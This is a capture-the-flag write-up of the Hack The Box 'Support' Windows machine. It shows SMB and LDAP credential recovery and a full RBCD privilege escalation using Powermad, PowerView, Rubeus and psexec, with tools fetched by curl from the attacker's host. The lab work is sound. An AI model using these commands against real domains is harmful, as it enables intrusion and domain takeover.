

#### About

Support is an Easy difficulty Windows machine that features an SMB share that allows anonymous authentication. After connecting to the share, an executable file is discovered that is used to query the machine&amp;amp;amp;#039;s LDAP server for available users. Through reverse engineering, network analysis or emulation, the password that the binary uses to bind the LDAP server is identified and can be used to make further LDAP queries. A user called `support` is identified in the users list, and the `info` field is found to contain his password, thus allowing for a WinRM connection to the machine. Once on the machine, domain information can be gathered through `SharpHound`, and `BloodHound` reveals that the `Shared Support Accounts` group that the `support` user is a member of, has `GenericAll` privileges on the Domain Controller. A Resource Based Constrained Delegation attack is performed, and a shell as `NT Authority\System` is received.



## Nmap
```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap <-- got support user password
445/tcp   open  microsoft-ds <-- got ldap password
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
49664/tcp open  unknown
49667/tcp open  unknown
49674/tcp open  unknown
49686/tcp open  unknown
49691/tcp open  unknown
49706/tcp open  unknown
```

## SMB shares

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/support/loot]
└─$ smbclient -L //10.129.50.167/ -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
```

## support-tools share

```bash
smbclient //10.129.50.167/support-tools -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022
```

Found this interesting file `UserInfo.exe.zip`

## unzip file
```bash
unzip UserInfo.exe.zip                   
Archive:  UserInfo.exe.zip
  inflating: UserInfo.exe            
  inflating: CommandLineParser.dll   
  inflating: Microsoft.Bcl.AsyncInterfaces.dll  
  inflating: Microsoft.Extensions.DependencyInjection.Abstractions.dll  
  inflating: Microsoft.Extensions.DependencyInjection.dll  
  inflating: Microsoft.Extensions.Logging.Abstractions.dll  
  inflating: System.Buffers.dll      
  inflating: System.Memory.dll       
  inflating: System.Numerics.Vectors.dll  
  inflating: System.Runtime.CompilerServices.Unsafe.dll  
  inflating: System.Threading.Tasks.Extensions.dll  
  inflating: UserInfo.exe.config     

┌──(kali㉿kali)-[~/Desktop/HTB/support/loot]
└─$ ls
CommandLineParser.dll                                      System.Buffers.dll                          UserInfo.exe
Microsoft.Bcl.AsyncInterfaces.dll                          System.Memory.dll                         UserInfo.exe.config
Microsoft.Extensions.DependencyInjection.Abstractions.dll  System.Numerics.Vectors.dll                 UserInfo.exe.zip
Microsoft.Extensions.DependencyInjection.dll               System.Runtime.CompilerServices.Unsafe.dll
Microsoft.Extensions.Logging.Abstractions.dll              System.Threading.Tasks.Extensions.dll
```

Using `strings`:
```
$5a280d0b-9fd0-4701-8f96-82e2f1ea9dfb


cat UserInfo.exe.config            
<?xml version="1.0" encoding="utf-8"?>
<configuration>
    <startup> 
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.8" />
    </startup>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="System.Runtime.CompilerServices.Unsafe" publicKeyToken="b03f5f7f11d50a3a" culture="neutral" />
        <bindingRedirect oldVersion="0.0.0.0-6.0.0.0" newVersion="6.0.0.0" />
      </dependentAssembly>
    </assemblyBinding>
  </runtime>
</configuration>

<UserName>k__BackingField
<LastName>k__BackingField
<FirstName>k__BackingField
<Verbose>k__BackingField

C:\Users\0xdf\source\repos\UserInfo\obj\Release\UserInfo.pdb                                            
```

## reverse engineer exe

Since this executable is a `.Net` using dnsSpy we can get a close to source code  decompilation.
![](pics/Pasted%20image%2020260827164516.png)
we are interested in how the program interact with LDAP
![](pics/Pasted%20image%2020260827164500.png)
digging deeper into the protected password variable
![](pics/Pasted%20image%2020260827164753.png)
We see that the password is encoded and xored with `armando` ass the key!

## Implementing a decryptor in python (for fun)

```python
import base64
def decrypt(passowrd, key):
    clear_password = ""
    decoded_password = base64.b64decode(passowrd)
    print(decoded_password)
    for i in range(len(decoded_password)):
        char = chr(decoded_password[i] ^ ord(key[i % len(key)]) ^ 223)
        clear_password += char
    print(f"Clear password is {clear_password}")
    return
password_string = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = "armando"
decrypt(password_string, key)
```

Done
![](pics/Pasted%20image%2020260827173943.png)

## Login via LDAP

```
new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);

user = support
pass = nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

```
┌──(kali㉿kali)-[~/Desktop/HTB/support]
└─$ ldapsearch -x -H ldap://support.htb -D "SUPPORT\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"
```

all CNs
```
cn: Users
cn: Computers
cn: System
cn: LostAndFound
cn: Infrastructure
cn: ForeignSecurityPrincipals
cn: Program Data
cn: Microsoft
cn: Managed Service Accounts
cn: WinsockServices
cn: RpcServices
cn: FileLinks
cn: ObjectMoveTable
cn: Default Domain Policy
cn: AppCategories
cn: Meetings
cn: Policies
cn: {31B2F340-016D-11D2-945F-00C04FB984F9}
cn: User
cn: Machine
cn: {6AC1786C-016F-11D2-945F-00C04fB984F9}
cn: User
cn: Machine
cn: RAS and IAS Servers Access Check
cn: File Replication Service
cn: Dfs-Configuration
cn: AdminSDHolder
cn: ComPartitions
cn: ComPartitionSets
cn: WMIPolicy
cn: PolicyTemplate
cn: SOM
cn: PolicyType
cn: WMIGPO
cn: DomainUpdates
cn: Operations
cn: ab402345-d3c3-455d-9ff7-40268a1099b6
cn: bab5f54d-06c8-48de-9b87-d78b796564e4
cn: f3dd09dd-25e8-4f9c-85df-12d6d2f2f2f5
cn: 2416c60a-fe15-4d7a-a61e-dffd5df864d3
cn: 7868d4c8-ac41-4e05-b401-776280e8e9f1
cn: 860c36ed-5241-4c62-a18b-cf6ff9994173
cn: 0e660ea3-8a5e-4495-9ad7-ca1bd4638f9e
cn: a86fe12a-0f62-4e2a-b271-d27f601f8182
cn: d85c0bfd-094f-4cad-a2b5-82ac9268475d
cn: 6ada9ff7-c9df-45c1-908e-9fef2fab008a
cn: 10b3ad2a-6883-4fa7-90fc-6377cbdc1b26
cn: 98de1d3e-6611-443b-8b4e-f4337f1ded0b
cn: f607fd87-80cf-45e2-890b-6cf97ec0e284
cn: 9cac1f66-2167-47ad-a472-2a13251310e4
cn: 6ff880d6-11e7-4ed1-a20f-aac45da48650
cn: 446f24ea-cfd5-4c52-8346-96e170bcb912
cn: 51cba88b-99cf-4e16-bef2-c427b38d0767
cn: a3dac986-80e7-4e59-a059-54cb1ab43cb9
cn: 293f0798-ea5c-4455-9f5d-45f33a30703b
cn: 5c82b233-75fc-41b3-ac71-c69592e6bf15
cn: 7ffef925-405b-440a-8d58-35e8cd6e98c3
cn: 4dfbb973-8a62-4310-a90c-776e00f83222
cn: 8437C3D8-7689-4200-BF38-79E4AC33DFA0
cn: 7cfb016c-4f87-4406-8166-bd9df943947f
cn: f7ed4553-d82b-49ef-a839-2f38a36bb069
cn: 8ca38317-13a4-4bd4-806f-ebed6acb5d0c
cn: 3c784009-1f57-4e2a-9b04-6915c9e71961
cn: 6bcd5678-8314-11d6-977b-00c04f613221
cn: 6bcd5679-8314-11d6-977b-00c04f613221
cn: 6bcd567a-8314-11d6-977b-00c04f613221
cn: 6bcd567b-8314-11d6-977b-00c04f613221
cn: 6bcd567c-8314-11d6-977b-00c04f613221
cn: 6bcd567d-8314-11d6-977b-00c04f613221
cn: 6bcd567e-8314-11d6-977b-00c04f613221
cn: 6bcd567f-8314-11d6-977b-00c04f613221
cn: 6bcd5680-8314-11d6-977b-00c04f613221
cn: 6bcd5681-8314-11d6-977b-00c04f613221
cn: 6bcd5682-8314-11d6-977b-00c04f613221
cn: 6bcd5683-8314-11d6-977b-00c04f613221
cn: 6bcd5684-8314-11d6-977b-00c04f613221
cn: 6bcd5685-8314-11d6-977b-00c04f613221
cn: 6bcd5686-8314-11d6-977b-00c04f613221
cn: 6bcd5687-8314-11d6-977b-00c04f613221
cn: 6bcd5688-8314-11d6-977b-00c04f613221
cn: 6bcd5689-8314-11d6-977b-00c04f613221
cn: 6bcd568a-8314-11d6-977b-00c04f613221
cn: 6bcd568b-8314-11d6-977b-00c04f613221
cn: 6bcd568c-8314-11d6-977b-00c04f613221
cn: 6bcd568d-8314-11d6-977b-00c04f613221
cn: 3051c66f-b332-4a73-9a20-2d6a7d6e6a1c
cn: 3e4f4182-ac5d-4378-b760-0eab2de593e2
cn: c4f17608-e611-11d6-9793-00c04f613221
cn: 13d15cf0-e6c8-11d6-9793-00c04f613221
cn: 8ddf6913-1c7b-4c59-a5af-b9ca3b3d2c4c
cn: dda1d01d-4bd7-4c49-a184-46f9241b560e
cn: a1789bfb-e0a2-4739-8cc0-e77d892d080a
cn: 61b34cb0-55ee-4be9-b595-97810b92b017
cn: 57428d75-bef7-43e1-938b-2e749f5a8d56
cn: ebad865a-d649-416f-9922-456b53bbb5b8
cn: 0b7fb422-3609-4587-8c2e-94b10f67d1bf
cn: 2951353e-d102-4ea5-906c-54247eeec741
cn: 71482d49-8870-4cb3-a438-b6fc9ec35d70
cn: aed72870-bf16-4788-8ac7-22299c8207f1
cn: f58300d1-b71a-4DB6-88a1-a8b9538beaca
cn: 231fb90b-c92a-40c9-9379-bacfc313a3e3
cn: 4aaabc3a-c416-4b9c-a6bb-4b453ab1c1f0
cn: 9738c400-7795-4d6e-b19d-c16cd6486166
cn: de10d491-909f-4fb0-9abb-4b7865c0fe80
cn: b96ed344-545a-4172-aa0c-68118202f125
cn: 4c93ad42-178a-4275-8600-16811d28f3aa
cn: c88227bc-fcca-4b58-8d8a-cd3d64528a02
cn: 5e1574f6-55df-493e-a671-aaeffca6a100
cn: d262aae8-41f7-48ed-9f35-56bbb677573d
cn: 82112ba0-7e4c-4a44-89d9-d46c9612bf91
cn: c3c927a6-cc1d-47c0-966b-be8f9b63d991
cn: 54afcfb9-637a-4251-9f47-4d50e7021211
cn: f4728883-84dd-483c-9897-274f2ebcf11e
cn: ff4f9d27-7157-4cb0-80a9-5d6f2b14c8ff
cn: 83C53DA7-427E-47A4-A07A-A324598B88F7
cn: C81FC9CC-0130-4FD1-B272-634D74818133
cn: E5F9E791-D96D-4FC9-93C9-D53E1DC439BA
cn: e6d5fd00-385d-4e65-b02d-9da3493ed850
cn: 3a6b3fbf-3168-4312-a10d-dd5b3393952d
cn: 7F950403-0AB3-47F9-9730-5D7B0269F9BD
cn: 434bb40d-dbc9-4fe7-81d4-d57229f7b080
cn: A0C238BA-9E30-4EE6-80A6-43F731E9A5CD
cn: Windows2003Update
cn: ActiveDirectoryUpdate
cn: PSPs
cn: Administrator
cn: Guest
cn: Builtin
cn: Administrators
cn: Users
cn: S-1-5-4
cn: S-1-5-11
cn: Guests
cn: Print Operators
cn: Backup Operators
cn: Replicator
cn: Remote Desktop Users
cn: Network Configuration Operators
cn: Performance Monitor Users
cn: Performance Log Users
cn: Distributed COM Users
cn: IIS_IUSRS
cn: S-1-5-17
cn: Cryptographic Operators
cn: Event Log Readers
cn: Certificate Service DCOM Access
cn: RDS Remote Access Servers
cn: RDS Endpoint Servers
cn: RDS Management Servers
cn: Hyper-V Administrators
cn: Access Control Assistance Operators
cn: Remote Management Users
cn: Storage Replica Administrators
cn: Server
cn: DC
cn: krbtgt
cn: Domain Computers
cn: Domain Controllers
cn: Schema Admins
cn: Enterprise Admins
cn: Cert Publishers
cn: Domain Admins
cn: Domain Users
cn: Domain Guests
cn: Group Policy Creator Owners
cn: RAS and IAS Servers
cn: Server Operators
cn: Account Operators
cn: Pre-Windows 2000 Compatible Access
cn: Incoming Forest Trust Builders
cn: Windows Authorization Access Group
cn: Terminal Server License Servers
cn: S-1-5-9
cn: 6E157EDF-4E72-4052-A82A-EC3F91021A22
cn: Allowed RODC Password Replication Group
cn: Denied RODC Password Replication Group
cn: Read-only Domain Controllers
cn: Enterprise Read-only Domain Controllers
cn: Cloneable Domain Controllers
cn: Protected Users
cn: Key Admins
cn: Enterprise Key Admins
cn: RID Manager$
cn: RID Set
cn: DnsAdmins
cn: DnsUpdateProxy
cn: Zone
cn: DFSR-GlobalSettings
cn: Domain System Volume
cn: Content
cn: SYSVOL Share
cn: Topology
cn: DC
cn: DFSR-LocalSettings
cn: Domain System Volume
cn: SYSVOL Subscription
cn: Shared Support Accounts
cn: ldap
cn: support
cn: smith.rosario
cn: hernandez.stanley
cn: wilson.shelby
cn: anderson.damian
cn: thomas.raphael
cn: levine.leopoldo
cn: raven.clifton
cn: bardot.mary
cn: cromwell.gerard
cn: monroe.david
cn: west.laura
cn: langley.lucy
cn: daughtler.mabel
cn: stoll.rachelle
cn: ford.victoria
```

## users
```
cn: smith.rosario
cn: hernandez.stanley
cn: wilson.shelby
cn: anderson.damian
cn: thomas.raphael
cn: levine.leopoldo
cn: raven.clifton
cn: bardot.mary
cn: cromwell.gerard
cn: monroe.david
cn: west.laura
cn: langley.lucy
cn: daughtler.mabel
cn: stoll.rachelle
cn: ford.victoria
```

Interesting user named `support`:
```
# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
-----------------------------------------------------------
info: Ironside47pleasure40Watchful <-- embeded passowrd!!!
-----------------------------------------------------------
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z
```

extracted password
```
info: Ironside47pleasure40Watchful
```


## Login
```
evil-winrm -i 10.129.50.167 -u support -p Ironside47pleasure40Watchful
```

![](pics/Pasted%20image%2020260827185111.png)


## flag 1
![](pics/Pasted%20image%2020260827185148.png)

## PrivEsc (rabit hole)

In the share there is a vuln notepad++ 
![](pics/Pasted%20image%2020260827190103.png)

### Extract it

```powershell
Expand-Archive -Path npp.8.4.1.portable.x64.zip
```
![](pics/Pasted%20image%2020260827190507.png)

upload it
![](pics/Pasted%20image%2020260827192501.png)

After a lot of trying turns out I was in a deep rabbit hole!
The real way to elevate privs is down here.

## Bloodhound enum

```
bloodhound-python -u support -p Ironside47pleasure40Watchful -ns 10.129.50.167 -d support.htb -c All
```
![](pics/Pasted%20image%2020260827211129.png)


## Abusing GenericAll for Privesc

bloodhound enum:
![](pics/Pasted%20image%2020260827230824.png)
Since we own support user we can perform this attack 
setup the tools
![](pics/Pasted%20image%2020260827230758.png)

Go to `programData` because it writeable
![](pics/Pasted%20image%2020260827231055.png)

setup the file server
![](pics/Pasted%20image%2020260827231152.png)

Download the needed files
```
// always add -o or it will fail
*Evil-WinRM* PS C:\programdata> curl 10.10.14.82:8000/Powermad.ps1 -o Powermad.ps1
*Evil-WinRM* PS C:\programdata> curl 10.10.14.82:8000/PowerView.ps1 -o PowerView.ps1
*Evil-WinRM* PS C:\programdata> curl 10.10.14.82:8000/Rubeus.exe -o Rubeus.exe
```

Import module then execute the command which create a new machine called `planted` with password `ret2zied`
```
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
```

set the new machine `sid` to a variable
```
Import-Module .\PowerView.ps1
$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
```

build a generic ACE ad get the binary bytes for the new DACL/ACE
```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```


set the `msDS-AllowedToActOnBehalfOfOtherIdentity` field 
```
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```


hash the plaintext password into its RC4_HMAC format
```
.\Rubeus.exe hash /password:Summer2018!

rc4_hmac : EF266C6B963C0BB683941032008AD47F
```

 get a service ticket for the `administrator`
```
.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt
```

And Got the base64 ticket
![](pics/Pasted%20image%2020260827235103.png)

Now decode base64
![](pics/Pasted%20image%2020260827235437.png)

convert the ticket to `ccache` format
![](pics/Pasted%20image%2020260827235552.png)

## flag 2
login via `psexec`:
```
KRB5CCNAME=ticket.ccache impacket-psexec -k -no-pass support.htb/administrator@dc.support.htb
```
![](pics/Pasted%20image%2020260828000633.png)


![](pics/Pasted%20image%2020260828212646.png)
